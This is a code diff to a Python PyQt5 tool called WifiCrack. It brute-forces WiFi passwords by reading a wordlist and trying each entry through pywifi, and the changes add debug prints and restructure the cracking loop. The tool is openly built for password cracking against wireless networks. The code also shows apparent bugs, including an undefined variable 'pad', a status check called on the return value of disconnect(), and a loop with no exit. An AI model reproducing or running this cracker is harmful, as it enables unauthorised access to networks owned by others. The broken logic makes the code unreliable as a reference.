@@ -3,6 +3,7 @@ from PyQt5.QtCore import QStringListModel
 from PyQt5.uic import loadUi
 import sys
 import pywifi
+import time
 
 class WifiCrack(QWidget):
     def __init__(self):
@@ -30,12 +31,13 @@ class WifiCrack(QWidget):
     def crackWifi(self):
         print("start cracking:")
         print(self.currentPwdFile)
-        file=open(self.currentPwdFile, "r")
-        while True:
-            try:
+        with open(self.currentPwdFile, 'r') as file:
+        #file=open(self.currentPwdFile, "r")
+            while True:
                 #一行一行读取
                 pwd=file.readline()
-                bConnected=wifiConnect(pwd)
+                print(pwd)
+                bConnected=self.wifiConnect(pwd)
                 
                 if bConnected:
                     print("密码已破解： ",pwd)
@@ -44,11 +46,11 @@ class WifiCrack(QWidget):
                 else:
                     #跳出当前循环，进行下一次循环
                     print("密码破解中....密码校对: ",pad)
-            except:
-                continue
 
     def wifiConnect(self, pwd):
+        print(self.ifaces)
         iface=self.ifaces[self.currentIfaceIdx].disconnect()
+        print(iface)
         time.sleep(1)
         wifistatus=iface.status()
         if wifistatus==const.IFACE_DISCONNECTED:
